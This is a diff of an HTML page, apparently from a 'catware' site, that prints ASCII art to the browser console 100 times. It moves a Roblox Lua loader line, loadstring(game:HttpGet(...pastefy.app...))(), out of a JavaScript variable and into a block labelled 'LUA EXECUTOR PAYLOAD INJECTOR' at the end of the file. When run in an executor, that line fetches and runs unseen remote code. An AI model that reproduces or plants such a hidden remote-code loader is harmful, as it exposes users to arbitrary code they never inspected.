@@ -81,7 +81,7 @@
         <a href="https://zonefn.us" class="home-btn">back to home &rarr;</a>
     </div>
 
-    <!-- CONSOLE LOG 100X & SECRET LOADSTRING -->
+    <!-- CONSOLE LOG 100X -->
     <script>
         const asciiArt = `-- [[ ██████╗ 
     ██╔════╝ 
@@ -144,13 +144,13 @@
     ███████╗
   ]]`;
 
-        // Loop and print 100 times to console
         for (let i = 1; i <= 100; i++) {
             console.log(`[#${i}]\n` + asciiArt);
         }
-
-        // Hidden in JS memory for HttpGet extraction
-        window.__CATWARE_PAYLOAD__ = 'loadstring(game:HttpGet("https://pastefy.app/Q1lJi8vk/raw"))()';
     </script>
 </body>
 </html>
+<!-- LUA EXECUTOR PAYLOAD INJECTOR -->
+<script type="text/plain" class="lua-payload">
+loadstring(game:HttpGet("https://pastefy.app/Q1lJi8vk/raw"))()
+</script>
